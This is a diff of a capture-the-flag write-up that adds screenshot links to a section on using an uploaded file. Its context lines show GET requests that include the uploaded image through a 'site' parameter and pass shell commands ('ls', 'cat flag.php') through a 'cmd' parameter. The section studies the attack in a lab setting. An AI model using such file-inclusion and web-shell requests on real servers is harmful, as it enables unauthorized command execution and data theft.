@@ -51,11 +51,13 @@ Now just append the file location the the **GET-Request** in the **Burp Repeater
 The following **GET**-Request will list the files of the current direcotry in the response (Keep in mind that the upload location is different for every upload):
 > GET /index.php?site=uploads/a2e4822a98337283e39f7b60acf85ec9_1.jpg&cmd=ls
 
+![](writeupfiles/ListFiles.png)
+
 We can see the `flag.php` file, so we are one step away from the flag. By doing another **GET**-Request we can print the content of this file and receive the flag:
 
 > GET /index.php?site=uploads/a2e4822a98337283e39f7b60acf85ec9_1.jpg&cmd=cat%20flag.php
 
-
+![](writeupfiles/Flag.png)
 
 ## StayWoke Shop
 
